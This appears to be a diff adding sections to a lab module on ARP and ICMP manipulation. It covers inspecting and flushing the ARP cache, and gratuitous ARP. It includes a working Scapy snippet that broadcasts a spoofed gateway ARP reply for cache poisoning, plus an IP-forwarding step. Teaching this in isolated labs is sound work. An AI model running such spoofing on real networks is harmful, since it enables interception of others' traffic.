@@ -1,5 +1,32 @@
 # Module 3 — ARP and ICMP Manipulation
 
+## Checking the ARP Cache
+
+Run these on both the attacker and target VMs to observe cache state before and after poisoning:
+
+```bash
+ip neigh        # modern iproute2 — preferred
+arp -n          # classic utility (-n skips DNS reverse lookup)
+```
+
+Example output:
+```
+192.168.56.2   dev eth1 lladdr 08:00:27:ab:cd:ef REACHABLE
+192.168.56.254 dev eth1 lladdr 08:00:27:11:22:33 STALE
+```
+
+Watch the cache update in real time during a poisoning exercise:
+```bash
+watch -n1 ip neigh
+```
+
+Flush entries to force fresh ARP resolution before a test:
+```bash
+sudo ip neigh flush dev eth1
+```
+
+---
+
 ## Why ARP Attacks Still Work
 
 ARP was designed in 1982 (RFC 826) for a trusted LAN. There is no authentication —
@@ -35,6 +62,39 @@ loses internet access — quickly noticed. Always enable forwarding first:
 ```bash
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 ```
+
+## Gratuitous ARP
+
+A gratuitous ARP is an ARP reply that nobody asked for — sent without a preceding request.
+
+Normal ARP exchange:
+```
+Host A → broadcast:  "Who has 192.168.56.2?"
+Host B → Host A:     "192.168.56.2 is at 08:00:27:ab:cd:ef"
+```
+
+Gratuitous ARP skips the question:
+```
+Host B → broadcast:  "192.168.56.2 is at 08:00:27:ab:cd:ef"  (unsolicited)
+```
+
+**Legitimate uses:** a host announces itself on boot, detects duplicate IPs, or a failover
+device (HSRP/VRRP) takes over an IP and updates the whole segment at once.
+
+**Why it is dangerous:** every host on the segment accepts it and updates their ARP cache with
+no validation. An attacker broadcasts "192.168.56.254 (gateway) is at *attacker_mac*" and every
+host immediately starts sending gateway-bound traffic to the attacker.
+
+In Scapy:
+```python
+sendp(
+    Ether(dst="ff:ff:ff:ff:ff:ff") /
+    ARP(op=2, pdst="192.168.56.254", psrc="192.168.56.254", hwsrc=attacker_mac),
+    iface="eth1"
+)
+```
+
+`op=2` is an ARP reply, `dst` is broadcast — that is the gratuitous ARP pattern.
 
 ## Gratuitous ARP vs. Targeted Reply
 
